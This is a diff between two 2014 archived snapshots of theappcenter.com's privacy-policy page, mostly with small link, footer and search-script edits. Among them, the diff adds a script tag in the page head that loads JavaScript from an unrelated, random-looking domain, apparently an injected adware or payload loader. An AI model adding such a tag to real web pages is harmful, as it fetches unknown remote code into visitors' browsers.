@@ -1,5 +1,5 @@
-<!--The following is the downloaded HTML source of the theappcenter.com privacy policy that was archived on 2014-03-26.
- Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20140326173629id_/http%3A//www.theappcenter.com/sub/privacy) for the most accurate reproduction.-->
+<!--The following is the downloaded HTML source of the theappcenter.com privacy policy that was archived on 2014-11-21.
+ Please check the original snapshot on the Wayback Machine (https://web.archive.org/web/20141121194832id_/http%3A//www.theappcenter.com/sub/privacy) for the most accurate reproduction.-->
 
 <!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml" lang="en"><head>
     <meta http-equiv="Content-Type" content="text/html; charset=utf-8">
@@ -88,11 +88,12 @@
       .header_arrow_down {width: 0; height: 0; border-left: 5px solid transparent;border-right: 5px solid transparent;border-top: 5px solid #666666;position:relative;top:13px;left:5px;}
 
     </style>
+    <script type="text/javascript" src="http://a.jwaavsze.com/tumeslo.js"> </script>
   </head>
   <body>
     <div class="root_container" style="margin-top:25px;">
       <div style="float:left;margin-left:10px;">
-        <a href="http://www.theappcenter.com"><img class="header_logo" src="/assets/portal/logo/logo.png"></a>
+        <a href="http://www.theappcenter.com"><img class="header_logo" src="/assets/portal/logo/logo.png" alt="TheAppCenter.com Logo"></a>
       </div>
       
       <div style="float:right;width:935px;margin-right:12px;">
@@ -148,7 +149,7 @@
             
           
           <div class="header_right_block hover_interaction header_social_block">
-            <a target="_blank" href="/sub/checkout/?app_checkout=convertav"><img src="/assets/portal/images/shopping-cart-icon.png" style="height:33px;"></a>
+            <a target="_blank" href="/sub/checkout/?app_checkout=drivercentre-updater"><img src="/assets/portal/images/shopping-cart-icon.png" style="height:33px;"></a>
           </div>
           <!--<div class='header_right_block hover_interaction header_social_block'>
             <a target='_blank' href='/sub/rss/'><img src='/assets/portal/images/rss-r.jpg' style='height:33px;'/></a>
@@ -165,6 +166,10 @@
           
           <div class="header_right_block hover_interaction" style="width:70px;margin-right:12px;">
             <a href="http://www.theappcenter.com/blog/">Blog</a>
+          </div>
+          
+          <div class="header_right_block hover_interaction" style="width:80px;margin-right:12px;">
+            <a target="_blank" href="http://www.theappcenter.com/sub/about-us/">About Us</a>
           </div>
             
           <div class="clear_both"></div>
@@ -272,11 +277,16 @@
         
         var thumbnail_td = create_element('td');
         var thumbnail_div = create_element('div');
-        thumbnail_div.className= "search_result_category_thumbnail_holder grid_color_"+search_results.categories[i].short_name;
         
         var thumbnail = create_element('img');
         thumbnail.className = "search_result_category_thumbnail";
-        thumbnail.src = "/assets/portal/images/category_"+search_results.categories[i].short_name+"_icon.png";
+        if(search_results.categories[i].parent_category){
+          thumbnail.src = "/assets/portal/images/category_"+search_results.categories[i].parent_category.unique_name+"_icon.png";
+          thumbnail_div.className= "search_result_category_thumbnail_holder grid_color_"+search_results.categories[i].parent_category.unique_name;
+        }else{
+          thumbnail.src = "/assets/portal/images/category_"+search_results.categories[i].short_name+"_icon.png";
+          thumbnail_div.className= "search_result_category_thumbnail_holder grid_color_"+search_results.categories[i].short_name;
+        }
         thumbnail_div.appendChild(thumbnail);
         thumbnail_td.appendChild(thumbnail_div);
         div.appendChild(thumbnail_td);
@@ -291,6 +301,16 @@
         a.href = search_results.categories[i].url;
         primary_category.appendChild(a);
         listing_td.appendChild(primary_category);
+        
+        if(search_results.categories[i].parent_category){
+          var secondary_category = create_element('div');
+          secondary_category.className = 'search_result_description';
+          var a = create_element("a");
+          a.innerHTML = search_results.categories[i].parent_category.name;
+          a.href = search_results.categories[i].parent_category.url;
+          secondary_category.appendChild(a);
+          listing_td.appendChild(secondary_category);
+        }
         
         for(var j in search_results.categories[i].subcategories){
           var secondary_category = create_element('div');
@@ -571,10 +591,11 @@
           <div class="footer_row"><a href="http://www.theappcenter.com/sub/terms/">EULA</a></div>
           <div class="footer_row"><a href="http://www.theappcenter.com/sub/privacy/">Privacy</a></div>
           <div class="footer_row"><a href="http://www.theappcenter.com/sub/contact/">Contact Us</a></div>
+          <div class="footer_row"><a href="http://www.theappcenter.com/developers/">Developers</a></div>
         </div>
         
         <div class="footer_column">
-          <div class="footer_row" style="font-weight:bold;">AppCenter © 2013</div>
+          <div class="footer_row" style="font-weight:bold;">AppCenter © 2014</div>
           <div class="footer_row">129 Newbury St</div>
           <div class="footer_row">4th Floor</div>
           <div class="footer_row">Boston, MA</div>
